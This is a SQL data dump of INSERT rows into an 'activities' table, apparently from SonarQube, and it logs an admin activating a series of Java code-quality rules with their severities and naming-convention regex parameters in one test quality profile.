INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2952, '2017-11-20 12:20:15.343', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S00115;ruleKey=squid:S00115;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;param_format=^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzFvbbGRdfPp-rLs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2953, '2017-11-20 12:20:15.366', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S00116;ruleKey=squid:S00116;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzGGbbGRdfPp-rLt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2954, '2017-11-20 12:20:15.399', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S00117;ruleKey=squid:S00117;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzGmbbGRdfPp-rLu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2955, '2017-11-20 12:20:15.417', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S00119;ruleKey=squid:S00119;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;param_format=^[A-Z][0-9]?$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzG5bbGRdfPp-rLv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2956, '2017-11-20 12:20:15.442', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S00120;ruleKey=squid:S00120;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;param_format=^[a-z]+(\.[a-z][a-z0-9]*)*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzHSbbGRdfPp-rLw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2957, '2017-11-20 12:20:15.481', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S106;ruleKey=squid:S106;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzH5bbGRdfPp-rLx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2958, '2017-11-20 12:20:15.538', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1065;ruleKey=squid:S1065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzIybbGRdfPp-rLy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2959, '2017-11-20 12:20:15.687', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1066;ruleKey=squid:S1066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzLHbbGRdfPp-rLz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2960, '2017-11-20 12:20:15.757', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1068;ruleKey=squid:S1068;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzMNbbGRdfPp-rL0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2961, '2017-11-20 12:20:15.847', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1075;ruleKey=squid:S1075;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzNnbbGRdfPp-rL1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2962, '2017-11-20 12:20:15.903', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1118;ruleKey=squid:S1118;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzOfbbGRdfPp-rL2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2963, '2017-11-20 12:20:15.94', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1125;ruleKey=squid:S1125;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzPEbbGRdfPp-rL3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2964, '2017-11-20 12:20:15.975', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1126;ruleKey=squid:S1126;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzPnbbGRdfPp-rL4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2965, '2017-11-20 12:20:16.012', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1133;ruleKey=squid:S1133;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzQMbbGRdfPp-rL5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2966, '2017-11-20 12:20:16.051', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1134;ruleKey=squid:S1134;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzQzbbGRdfPp-rL6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2967, '2017-11-20 12:20:16.076', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1135;ruleKey=squid:S1135;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzRMbbGRdfPp-rL7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2968, '2017-11-20 12:20:16.094', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1141;ruleKey=squid:S1141;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzRebbGRdfPp-rL8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2969, '2017-11-20 12:20:16.118', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1143;ruleKey=squid:S1143;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzR2bbGRdfPp-rL9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2970, '2017-11-20 12:20:16.137', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1148;ruleKey=squid:S1148;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzSJbbGRdfPp-rL-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2971, '2017-11-20 12:20:16.163', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1149;ruleKey=squid:S1149;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzSjbbGRdfPp-rL_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2972, '2017-11-20 12:20:16.193', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1150;ruleKey=squid:S1150;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzTBbbGRdfPp-rMA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2973, '2017-11-20 12:20:16.24', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1153;ruleKey=squid:S1153;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzTwbbGRdfPp-rMB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2974, '2017-11-20 12:20:16.284', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1155;ruleKey=squid:S1155;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzUcbbGRdfPp-rMC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2975, '2017-11-20 12:20:16.312', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1157;ruleKey=squid:S1157;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzU4bbGRdfPp-rMD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2976, '2017-11-20 12:20:16.339', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1158;ruleKey=squid:S1158;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzVTbbGRdfPp-rME');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2977, '2017-11-20 12:20:16.366', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1161;ruleKey=squid:S1161;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzVubbGRdfPp-rMF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2978, '2017-11-20 12:20:16.395', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1163;ruleKey=squid:S1163;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzWLbbGRdfPp-rMG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2979, '2017-11-20 12:20:16.424', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1165;ruleKey=squid:S1165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzWobbGRdfPp-rMH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2980, '2017-11-20 12:20:16.46', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1168;ruleKey=squid:S1168;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzXMbbGRdfPp-rMI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2981, '2017-11-20 12:20:16.503', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1170;ruleKey=squid:S1170;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzX3bbGRdfPp-rMJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2982, '2017-11-20 12:20:16.53', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1171;ruleKey=squid:S1171;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzYSbbGRdfPp-rMK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2983, '2017-11-20 12:20:16.56', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1172;ruleKey=squid:S1172;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzYwbbGRdfPp-rML');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2984, '2017-11-20 12:20:16.595', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1174;ruleKey=squid:S1174;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzZTbbGRdfPp-rMM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2985, '2017-11-20 12:20:16.621', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1175;ruleKey=squid:S1175;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzZtbbGRdfPp-rMN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2986, '2017-11-20 12:20:16.635', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1181;ruleKey=squid:S1181;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzZ7bbGRdfPp-rMO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2987, '2017-11-20 12:20:16.652', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1182;ruleKey=squid:S1182;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzaMbbGRdfPp-rMP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2988, '2017-11-20 12:20:16.693', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1185;ruleKey=squid:S1185;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXza1bbGRdfPp-rMQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2989, '2017-11-20 12:20:16.722', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1186;ruleKey=squid:S1186;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzbSbbGRdfPp-rMR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2990, '2017-11-20 12:20:16.768', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1190;ruleKey=squid:S1190;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzcAbbGRdfPp-rMS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2991, '2017-11-20 12:20:16.794', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1191;ruleKey=squid:S1191;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;param_Exclude=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzcabbGRdfPp-rMT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2992, '2017-11-20 12:20:16.812', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1192;ruleKey=squid:S1192;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;param_threshold=3;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzcsbbGRdfPp-rMU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2993, '2017-11-20 12:20:16.828', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1193;ruleKey=squid:S1193;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzc8bbGRdfPp-rMV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2994, '2017-11-20 12:20:16.854', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1195;ruleKey=squid:S1195;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzdWbbGRdfPp-rMW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2995, '2017-11-20 12:20:16.881', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1197;ruleKey=squid:S1197;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzdxbbGRdfPp-rMX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2996, '2017-11-20 12:20:16.906', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1199;ruleKey=squid:S1199;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzeKbbGRdfPp-rMY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2997, '2017-11-20 12:20:16.932', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1201;ruleKey=squid:S1201;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzekbbGRdfPp-rMZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2998, '2017-11-20 12:20:16.953', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1206;ruleKey=squid:S1206;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXze5bbGRdfPp-rMa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2999, '2017-11-20 12:20:16.979', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1210;ruleKey=squid:S1210;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzfTbbGRdfPp-rMb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3000, '2017-11-20 12:20:17.013', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1214;ruleKey=squid:S1214;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzf1bbGRdfPp-rMc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3001, '2017-11-20 12:20:17.039', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1215;ruleKey=squid:S1215;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzgPbbGRdfPp-rMd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3002, '2017-11-20 12:20:17.06', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1217;ruleKey=squid:S1217;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzgkbbGRdfPp-rMe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3003, '2017-11-20 12:20:17.085', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1219;ruleKey=squid:S1219;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzg9bbGRdfPp-rMf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3004, '2017-11-20 12:20:17.114', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1220;ruleKey=squid:S1220;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzhabbGRdfPp-rMg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3005, '2017-11-20 12:20:17.133', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1221;ruleKey=squid:S1221;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzhtbbGRdfPp-rMh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3006, '2017-11-20 12:20:17.159', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1223;ruleKey=squid:S1223;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXziHbbGRdfPp-rMi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3007, '2017-11-20 12:20:17.185', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1226;ruleKey=squid:S1226;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzihbbGRdfPp-rMj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3008, '2017-11-20 12:20:17.209', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1264;ruleKey=squid:S1264;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzi5bbGRdfPp-rMk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3009, '2017-11-20 12:20:17.236', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S128;ruleKey=squid:S128;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzjUbbGRdfPp-rMl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3010, '2017-11-20 12:20:17.264', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1301;ruleKey=squid:S1301;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzjwbbGRdfPp-rMm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3011, '2017-11-20 12:20:17.29', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1313;ruleKey=squid:S1313;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzkKbbGRdfPp-rMn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3012, '2017-11-20 12:20:17.327', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1317;ruleKey=squid:S1317;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzkvbbGRdfPp-rMo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3013, '2017-11-20 12:20:17.39', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1319;ruleKey=squid:S1319;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzlubbGRdfPp-rMp');
